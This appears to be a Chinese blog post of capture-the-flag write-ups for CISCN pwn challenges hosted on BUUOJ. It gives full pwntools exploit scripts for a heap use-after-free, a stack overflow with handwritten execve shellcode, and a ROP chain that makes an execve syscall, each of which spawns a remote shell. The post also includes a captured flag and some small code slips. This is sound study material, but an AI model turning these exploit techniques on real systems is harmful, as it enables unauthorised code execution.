---
title: ciscn_pwn泛做
date: 2022-10-25 19:23:36
tags: pwn
---

## ciscn_2019_n_3

### 知识点

+ `fastbin attach`
+ `uaf`

### 题目分析

#### New note

``` c
int do_new()
{
  int v1; // eax
  int v2; // [esp+0h] [ebp-18h]
  int v3; // [esp+4h] [ebp-14h]
  size_t size; // [esp+Ch] [ebp-Ch]

  v2 = ask("Index");
  if ( v2 < 0 || v2 > 16 )
    return puts("Out of index!");
  if ( records[v2] )
    return printf("Index #%d is used!\n", v2);
  records[v2] = (int)malloc(0xCu);
  v3 = records[v2];
  *(_DWORD *)v3 = rec_int_print;
  *(_DWORD *)(v3 + 4) = rec_int_free;
  puts("Blob type:");
  puts("1. Integer");
  puts("2. Text");
  v1 = ask("Type");
  if ( v1 == 1 )
  {
    *(_DWORD *)(v3 + 8) = ask("Value");
  }
  else
  {
    if ( v1 != 2 )
      return puts("Invalid type!");
    size = ask("Length");
    if ( size > 0x400 )
      return puts("Length too long, please buy pro edition to store longer note!");
    *(_DWORD *)(v3 + 8) = malloc(size);
    printf("Value > ");
    fgets(*(char **)(v3 + 8), size, stdin);
    *(_DWORD *)v3 = rec_str_print;
    *(_DWORD *)(v3 + 4) = rec_str_free;
  }
  puts("Okey, got your data. Here is it:");
  return (*(int (__cdecl **)(int))v3)(v3);
}
```

输入`Integer`时的内存布局

![](/images/ciscn_buu_pwn/1.jpg)

对应的`rec_int_free`函数是，如果输入的是整数，那么直接`free`掉`record[id]`指向的`chunk`即可

``` cpp
int __cdecl rec_int_free(void *ptr)
{
  free(ptr);
  return puts("Note freed!");
}
```

输入`Text`时的内存布局

![](/images/ciscn_buu_pwn/2.jpg)

对应的`rec_str_free`函数是，不仅`free`掉`record[id]`指向的`chunk`，`free`掉`ptr`指向的保存`Text`的`chunk`

``` cpp
int __cdecl rec_str_free(void *ptr)
{
  free(*((void **)ptr + 2));
  free(ptr);
  return puts("Note freed!");
}
```

可以发现，这两个`free`函数里面都有`uaf`的漏洞

#### Delete note的具体过程

``` cpp
int do_del()
{
  int v0; // eax

  v0 = ask("Index");
  return (*(int (__cdecl **)(int))(records[v0] + 4))(records[v0]);
}
```

`del`就是调用对应的`free`函数，而传入的参数就是`record[id]`指向的地址

#### 漏洞利用

考虑把存储`free`函数地址的内存替换成`system`的地址，然后把`record[id]`指向的地址的内容改为`sh\x00\x00`(由于是`32`位的，所以只传入`sh`)

可以先创建两个输入`Integer`的`chunk`，即`new_note_int(0,0)`，`new_note_int(1,0)`，此时内存布局如下

![](/images/ciscn_buu_pwn/3.jpg)

然后`free`掉两个，即`del(0)`，`del(1)`

此时`fastbin`中的布局如下

![](/images/ciscn_buu_pwn/4.jpg)

注意，`fastbin`是FILO即先进后出，所以我们申请一个写入长度为`0xc`的字符串即`payload=sh\x00\x00 + p32(system_plt)`。申请一个`new_note_str(2,0xc,payload)`，注意此时`record[2]`会先申请`addr2`所在的`chunk`，内容部分会申请在`addr1`所在的`chunk`

![](/images/ciscn_buu_pwn/5.jpg)

然后由于`record[0]`中的记录没有被删除，所以`del(0)`，此时会调用

```c
return (*(int (__cdecl **)(int))(records[v0] + 4))(records[v0]);
```

其实就是

```c
system_plt(sh\x00\x00);
```

#### 解答

``` python
from pwn import *
p=remote('node4.buuoj.cn',29409)
context(os='linux',arch='i386',log_level='debug')
pwn_file='./problem/ciscn_2019_n_3'
def new_int(id,num):
    p.sendlineafter("> ",'1')
    p.recvuntil("> ")
    p.sendline(str(id))
    p.recvuntil("> ")
    p.sendline('1')
    p.recvuntil("> ")
    p.sendline(num)
def new_str(id,Len,text):
    p.recvuntil("> ")
    p.sendline('1')
    p.recvuntil("> ")
    p.sendline(str(id))
    p.recvuntil("> ")
    p.sendline('2')
    p.recvuntil("> ")
    p.sendline(str(Len))
    p.recvuntil("Value > ")
    p.sendline(text)

def dele(id):
    p.recvuntil("> ")
    p.sendline('2')
    p.recvuntil("> ")
    p.sendline(str(id))
def show(id):
    p.recvuntil("> ")
    p.sendline('3')
    p.recvuntil("> ")
    p.sendline(str(id))

new_str(0,'0')
new_str(1,'0')
dele(0)
dele(1)
elf=ELF(pwn_file)
system_plt=elf.plt['system']
#payload = flat(['sh\x00\x00', system_plt])
payload=b'sh\x00\x00'+p32(system_plt)
new_str(2,0xc,payload)
dele(0)
p.interactive()
```



## ciscn_s_9

### 知识点

+ 栈溢出
+ `shellcode`书写

没有开启任何保护

`pwn`函数

``` c
int pwn()
{
  char s[32]; // [esp+8h] [ebp-20h] BYREF

  puts("\nHey! ^_^");
  puts("\nIt's nice to meet you");
  puts("\nDo you have anything to tell?");
  puts(">");
  fflush(stdout);
  fgets(s, 50, stdin);
  puts("OK bye~");
  fflush(stdout);
  return 1;
}
```

可以发现`s`发生了栈溢出，然后注意到还有一个函数

`hint`

``` c
void hint()
{
  __asm { jmp     esp }
}
```

没有开启NX保护，所以考虑在栈上执行，即将`pc`指向栈上的地址

一般可以用`shellcraft.sh()`来生成`shellcode`，但是长度不够，我们要栈溢出，先考虑要溢出的字符长度

`0x28=40=32+4+4`：`s`的长度(`32`字节)+原来的`ebp`(`4`字节)+`ret`的位置(`4`字节)

所以先将`shellcode`在`fgets`的时候输入到栈上，然后覆盖返回地址为`jmp  esp`。

`shellcode`的编写如下 

``` python
shellcode ='''
xor eax,eax             #eax置0
xor edx,edx			   #edx置0
push edx			   #将0入栈，标记了”/bin/sh”的结尾
push 0x68732f2f         #传递"/sh"，为了4字节对齐，使用//sh，这在execve()中等同于/sh  68-h 73-s 2f-/ 2f-/
push 0x6e69622f         #传递"/bin"  6e-n 69-i 62-b 2f-/ ,这里是exec的参数进栈，32位通过栈来传参
mov ebx,esp             #此时esp指向了”/bin/sh”,通过esp将该字符串的值传递给ebx
xor ecx,ecx
mov al,0xB              #eax置为execve函数的中断号
int 0x80                #调用软中断
'''
```

发送如下`payload`

``` python
payload=shellcode.ljust(0x24,b'\x00')+p32(jump_esp)+asm("sub esp,40;call esp")
```

此时的栈布局如下

```  
|            |                  low address 
| shellcode  | 0x20            
|            |
--------------
|(old ebp)00 | 0x4
| jump_esp   | 0x4              hight address
--------------
| sub esp,40 |<-esp
|  call esp  |
```

溢出返回地址后，跳转到`esp`所在的地址，即要执行`sub esp,40`，为什么要执行这个，因为`esp`是往低地址增的，所以为了拉高`esp`回到原来的`shellcode`在栈上的位置，即`esp-40`，更改完`esp`后，直接`call esp`来到`shellcode`的开始位置执行

注意使用`asm`的时候，需要执行运行及其的架构

``` python
from pwn import *
p=remote('node4.buuoj.cn',27774)
context(log_level='debug',arch='i386',os='linux')
jump_esp=0x8048554
shellcode ='''
xor eax,eax             #eax置0
xor edx,edx				#edx置0
push edx				#将0入栈，标记了”/bin/sh”的结尾
push 0x68732f2f         #传递”/sh”，为了4字节对齐，使用//sh，这在execve()中等同于/sh  68-h 73-s 2f-/ 2f-/
push 0x6e69622f         #传递“/bin”  6e-n 69-i 62-b 2f-/
mov ebx,esp             #此时esp指向了”/bin/sh”,通过esp将该字符串的值传递给ebx
xor ecx,ecx
mov al,0xB              #eax置为execve函数的中断号
int 0x80                #调用软中断
'''
shellcode=asm(shellcode)
#23
#shellcode = "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80"
payload=shellcode.ljust(0x24,b'\x00')+p32(jump_esp)
#40
payload+=asm("sub esp,40;call esp")
p.sendline(payload)
p.interactive()

```

## ciscn_final_3

知识点

+ `tcache_dup`：注意在`2.27-3ubuntu1`之后的`libc`版本不可使用

## ciscn_s_8
知识点
+ ROP(execve syscall)
+ 栈溢出
+ 输入加密处理

题目

首先运行以下程序，根据字符串找对应的函数

![](/images/ciscn_buu_pwn/3-1670562794736.jpg)

![](/images/ciscn_buu_pwn/4-1670563246093.jpg)

利用思路

栈溢出、没有Canary，再字符串中没有找到`/bin/sh`。在Disassembly界面`Alt T`寻找`syscall`字符串，发现有，所以考虑使用`execve`，在`x64`下，`execve`的系统调用号是$59$

``` c
int execve(const char *filename, char *const argv[], char *const envp[]);
```

`execve`有三个参数，第一个是存放了`/bin//sh`的指针，后面两个设置位`NULL`即可。那这个`/bin//sh`要存放在哪里呢？当然，可以放在栈上，但地址不容易确定。所以考虑放在`.bss`段上，在IDA用`Ctrl + s`即可查看各个段的位置。

所以我们的思路是利用ROP，先在`.bss`段开头处存放`/bin//sh`，然后设置`systcall`的参数，最后调用`syscall`即可

在Linux系统下`man syscall`可以方便看到不同架构下`syscall`调用的寄存器情况

用汇编写就是

``` asm
mov rsi [bss]
mov rax "/bin//sh"
mov [rsi] rax
mov rdi [bss]	 ;设置第一个参数
mov rdx 0		 ;设置第三个参数
mov rsi 0         ;设置第二个参数
mov rax 0x3B	  ;设置系统调用号
call syscall
```

exp

``` python
from pwn import *

p=remote('node4.buuoj.cn',29457)
context.log_level='debug'
def encode(s):
    res=''
    for i in range(len(s)):
        res += chr(s[i]^0x66)
    return res
pop_rdi = 0x4006e6
pop_rdx_rsi = 0x44c179
pop_rsi = 0x4040fe
bss = 0x6BC2E0
read = 0x449BE0
puts = 0x410550
open = 0x4102B0
syscall = 0x40139c
pop_rax = 0x449b9c
mov_rax_inrsi = 0x47f7b1
ROP = p64(pop_rsi) + p64(bss) + p64(pop_rax) + b'/bin//sh' + p64(mov_rax_inrsi) # input /bin/sh
ROP += p64(pop_rdi) + p64(bss) + p64(pop_rdx_rsi) + p64(0)*2 + p64(pop_rax) + p64(0x3B) + p64(syscall)
p.recvuntil("Please enter your Password: \n")
payload = 'a'*0x50 + encode(ROP)
p.sendline(payload)
p.interactive()
#flag{0b3cbb3d-891c-4f56-8b75-33f4f7d17bc7}
```

